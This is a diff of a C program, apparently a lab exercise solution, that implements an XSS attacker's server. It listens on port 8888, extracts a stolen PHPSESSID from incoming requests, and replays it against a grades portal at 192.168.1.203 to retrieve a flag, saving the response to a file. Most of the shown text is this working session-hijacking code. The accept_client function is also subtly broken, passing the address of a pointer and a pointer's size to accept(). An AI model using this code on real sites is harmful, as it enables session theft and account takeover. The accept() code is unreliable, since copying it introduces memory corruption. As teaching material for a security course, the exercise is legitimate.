@@ -3,11 +3,6 @@
  * 
  * XSS Attack Demonstration - Attacker's Server
  * 
- * This program implements a simple HTTP server that listens on port 8888
- * and captures one HTTP GET request. It logs the entire request to
- * spoofed-reflected.txt for analysis, particularly to extract session cookies
- * stolen via reflected XSS attacks.
- * 
  * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_reflected.c -o ex3_reflected
  */
 
@@ -19,12 +14,22 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+// port used when connecting with the web server
 #define WEB_PORT 80
+// port that the attacker server listens on
 #define PORT 8888
+// maximum size for buffers handling HTTP data
 #define BUFFER_SIZE 8192
+// web server's IP address
 #define WEB_IP "192.168.1.203"
+// output file where the web server response is stored
 #define OUTPUT_FILE "spoofed-reflected.txt"
+// maximum size for cookie buffer
 #define COOKIE_LEN 64
+// return value for failure
+#define FAILURE 0
+// return value for success
+#define SUCCESS 1
 
 
 /*
@@ -34,7 +39,7 @@
  * @out_size: Size of the output buffer
  * 
  * Searches for PHPSESSID in the Cookie header or URL parameters and
- * extracts only its value without any prefix.
+ * extracts *only its value* without any prefix.
  * 
  * Returns: 1 on success, 0 if PHPSESSID not found or error
  */
@@ -42,173 +47,217 @@ static int extract_sessid(const char *request,
                           char *sessid_out,
                           size_t out_size)
 {
-  const char *cookie_start = strstr(request, "cookie=");
-  if (cookie_start == NULL) {
-    return 0;
-  }
+    // pointer to the beginning of "cookie="
+    const char *cookie_start = strstr(request, "cookie=");
+    // if "cookie=" was not found
+    if (cookie_start == NULL) {
+       return FAILURE;
+    }
+    // move the pointer ahead of "cookie="
+    cookie_start += strlen("cookie=");
 
-  cookie_start += strlen("cookie=");
+    // expect cookie=PHPSESSID
+    const char *sessid = strstr(cookie_start, "PHPSESSID=");
+    // if "PHPSESSID=" was not found
+    if (sessid == NULL)
+        return FAILURE;
+    // move the pointer ahead of "PHPSESSID="
+    sessid += strlen("PHPSESSID=");
 
-  /* expect cookie=PHPSESSID=....*/
-  const char *sessid = strstr(cookie_start, "PHPSESSID=");
-  if (sessid == NULL)
-    return 0;
+    // finding the length of the PHPSESSID=<value>
+    const char *end = sessid;
+    while (*end != '\0' &&
+           *end != ' ' &&
+           *end != '&' &&
+           *end != '\r' &&
+           *end != '\n')
+    {
+        end++;
+    }
+    // store the length
+    size_t len = (size_t)(end - sessid);
+    // check if the length is invalid
+    if (len == 0 || len >= out_size)
+    {
+       return FAILURE;
+    }
+    // copy 'len' bytes to sessid_out. starting from sessid.
+    // sessid points to the character right after 'PHPSESSID='
+    memcpy(sessid_out, sessid, len);
+    // terminate - 'mark' the end of string
+    sessid_out[len] = '\0';
 
-  sessid += strlen("PHPSESSID=");
-
-
-  const char *end = sessid;
-  while (*end != '\0' &&
-         *end != ' ' &&
-         *end != '&' &&
-         *end != '\r' &&
-         *end != '\n')
-  {
-    end++;
-  }
-
-  size_t len = (size_t)(end - sessid);
-  if (len == 0 || len >= out_size)
-    return 0;
-
-  memcpy(sessid_out, sessid, len);
-  sessid_out[len] = '\0';
-  return 1;
+    return SUCCESS;
 }
 
 /*
  * RECV RESPONSE FROM WEB SERVER AND WRITES TO FILE
- * 0-fail
- * 1-success
+ * recv_response_from_web - reads the response from the web server and
+ * writes the stolen cookie and html page to OUTPUT_FILE.
+ * @web_fd (int): the socket fd connected between attacker server and web
+ * server.
+ * Returns: 1 on success, 0 if error occurs.
  */
 static int recv_response_from_web(int web_fd){
+    // open the output file
 	FILE * output_file = fopen(OUTPUT_FILE, "w");
-  if (!output_file) {
-    return 0;
-  }
-  char response_from_web[BUFFER_SIZE];
-  memset(response_from_web,0,BUFFER_SIZE);
+    // check if file opened successfully
+    if (!output_file) {
+       return FAILURE;
+    }
+    // init buffer to store the response
+    char response_from_web[BUFFER_SIZE];
+    // 'clean' the buffer
+    memset(response_from_web,0,BUFFER_SIZE);
+    // flg that indicates at least one byte of response was captured
 	int recv_flg=0;
+    // init len of received bytes
 	ssize_t recv_len;
-  while((recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1))>0){
-fwrite(response_from_web,1,(size_t)recv_len,output_file);
-memset(response_from_web,0,BUFFER_SIZE);
-recv_flg=1;
-}
-fclose(output_file);
-return recv_flg;
+    // keep reading response until there are no bytes left (to read).
+    while((recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1))>0){
+        // write to the output file the bytes just captured
+        fwrite(response_from_web,1,(size_t)recv_len,output_file);
+        // 'clean' the buffer - making space for the unread bytes
+        memset(response_from_web,0,BUFFER_SIZE);
+        // recv_len > 0 at least once
+        recv_flg=1;
+    }
+    // close the OUTPUT_FILE - cuz we wrote the response
+    fclose(output_file);
+
+    return recv_flg;
 }
 
 /*
- * SEND REQUEST
- * 0-fail
- * 1-success
- *
+ * creates a TCP connection  to the web server and sends an HTTP GET request
+ * that includes the extracted session ID of the stolen cookie.
+ * @ cookie_id - 'PHPSESSID' value
+ * Returns 1 on success and 0 on failure.
  */
 static int send_request_to_web(const char *cookie_id)
 {
-  int web_fd = socket (AF_INET, SOCK_STREAM, 0);
-  if (web_fd < 0) {
-	return 0;
-	}
+    // create socket
+    int web_fd = socket (AF_INET, SOCK_STREAM, 0);
+    // check if opened successfully
+    if (web_fd < 0) {
+        return FAILURE;
+    }
 
-  struct sockaddr_in web_addr;
-  web_addr.sin_family = AF_INET;
-  web_addr.sin_port = htons (WEB_PORT);
+    struct sockaddr_in web_addr;
+    web_addr.sin_family = AF_INET;
+    web_addr.sin_port = htons (WEB_PORT);
+    // convert IP string to binary form
+    if (inet_pton (AF_INET, WEB_IP, &web_addr.sin_addr) <= 0){
+        close (web_fd);
+        return FAILURE;
+    }
+    // connect to web server
+    if (connect (web_fd, (struct sockaddr *) &web_addr, sizeof (web_addr)) < 0){
+        close(web_fd);
+        return FAILURE;
+    }
 
-  if (inet_pton (AF_INET, WEB_IP, &web_addr.sin_addr) <= 0){
-    close (web_fd);
-    return 0;
-}
-
-  if (connect (web_fd, (struct sockaddr *) &web_addr, sizeof (web_addr)) < 0){
+    // init request buffer
+    char request[BUFFER_SIZE];
+    // HTTP GET request - to get the flag from 'gradesPortal.php'
+    int len = snprintf (request, sizeof (request),
+                        "GET /gradesPortal.php HTTP/1.1\r\n"
+                        "Host: %s\r\n"
+                        "Cookie: PHPSESSID=%.*s\r\n"
+                        "Connection: close\r\n\r\n",
+                        WEB_IP, COOKIE_LEN, cookie_id);
+    // check if request was stored in its buffer successfully
+    if (len <= 0 || len >= BUFFER_SIZE){
+        close(web_fd);
+        return FAILURE;
+    }
+    // send the request to web server
+    if (send (web_fd, request, strlen(request), 0) < 0){
+        close(web_fd);
+        return FAILURE;
+    }
+    // capture the request's response drom the web server and write it to
+    // OUTPUT_file
+    if (recv_response_from_web (web_fd) != 1){
+        close (web_fd);
+        return FAILURE;
+    }
+    // close socket
     close(web_fd);
-    return 0;
-  }
-
-  // GET THE FLAG FROM 'gradesPortal.php'
-  char request[BUFFER_SIZE];
-  int len = snprintf (request, sizeof (request),
-                      "GET /gradesPortal.php HTTP/1.1\r\n"
-                      "Host: %s\r\n"
-                      "Cookie: PHPSESSID=%.*s\r\n"
-                      "Connection: close\r\n\r\n",
-                      WEB_IP, COOKIE_LEN, cookie_id);
-
-  if (len <= 0 || len >= BUFFER_SIZE){
-    close(web_fd);
-    return 0;
-}
-
-  if (send (web_fd, request, strlen(request), 0) < 0){
-    close(web_fd);
-    return 0;
-}
-
-  if (recv_response_from_web (web_fd) != 1){
-    close (web_fd);
-    return 0;
-}
-  close(web_fd);
-  return 1;
+    return SUCCESS;
 }
 
 /*
- * SET UP SERVERS SOCKET
- * RETURN FD
+ * setup_server_socket - opens socket and configures it to allow reusing
+ * addresses
+ * and ports. ( SO_REUSEADDR and SO_REUSEPORT)
+ * Returns fd of the opened socket. else, if couldn't open and set its options
+ * as described above - the program will exit with exit code 1 = EXIT_FAILURE.
  */
 static int setup_server_socket(void)
 {
-  int fd = socket(AF_INET, SOCK_STREAM, 0);
-  if (fd < 0) {
-    perror("socket");
-    exit(EXIT_FAILURE);
-  }
-
-  int opt = 1;
-  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
-                 &opt, (socklen_t)sizeof(opt)) < 0) {
-    perror("setsockopt SO_REUSEADDR");
-    close(fd);
-    exit(EXIT_FAILURE);
-  }
-  
-  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT,
+    // open socket
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    // check if opened successfully
+    if (fd < 0) {
+        exit(EXIT_FAILURE);
+    }
+    // setting options - taken from ex0.pdf
+    int opt = 1;
+    // allows reusing a local addr (IP+PORT) even if it's still marked "in
+    // use" after closing (in case restarting server quickly)
+    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
                    &opt, (socklen_t)sizeof(opt)) < 0) {
-        perror("setsockopt SO_REUSEPORT");
         close(fd);
         exit(EXIT_FAILURE);
     }
-
-  return fd;
+    // reusing port - allows multiple sockets (or processes)
+    // to bind to the same port number.
+    if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT,
+                     &opt, (socklen_t)sizeof(opt)) < 0) {
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
+    // return the opened sockect fd.
+    return fd;
 }
+
 /*
- * SERVER BIND AND LISTEN
+ * binds the server socket to PORT and start listening.
+ * @ server_fd - socket id
+ * Returns 1 on success and 0 on failure.
  */
 static int bind_and_listen(int server_fd)
 {
+  // init local server address
   struct sockaddr_in server_addr;
-
+  // 'clean' to avoid garbage
   memset(&server_addr, 0, sizeof(server_addr));
-  server_addr.sin_family = AF_INET;
-  server_addr.sin_addr.s_addr = INADDR_ANY;
-  server_addr.sin_port = htons(PORT);
-
+  server_addr.sin_family = AF_INET; // IPv4
+  server_addr.sin_addr.s_addr = INADDR_ANY; // accept any local net interface
+  server_addr.sin_port = htons(PORT); // converts to net byte order
+  // binds the socket to address and port
   if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-    return 0;
+    return FAILURE;
   }
-
+  // put socket in listening mode
   if (listen(server_fd, 1) < 0) {
-    return 0;
+    return FAILURE;
   }
-  return 1;
+  return SUCCESS;
 }
 
 /*
- * ACCEPT CLIENT
+ * waits (blocks) until an incoming client establishes a TCP connection
+ * to the listening server socket.
+ * @server_fd - listening server socket
+ * @client_addr - stores the clients address and port
+ * Returns client socket on success
  */
 static int accept_client(int server_fd, struct sockaddr_in *client_addr){
+  // length of client address atruct
   socklen_t  client_addr_len = sizeof(client_addr);
+  // accept() blocks until a client connects
   int client_fd = accept(server_fd, (struct sockaddr *)&client_addr,
                          &client_addr_len);
   return client_fd;
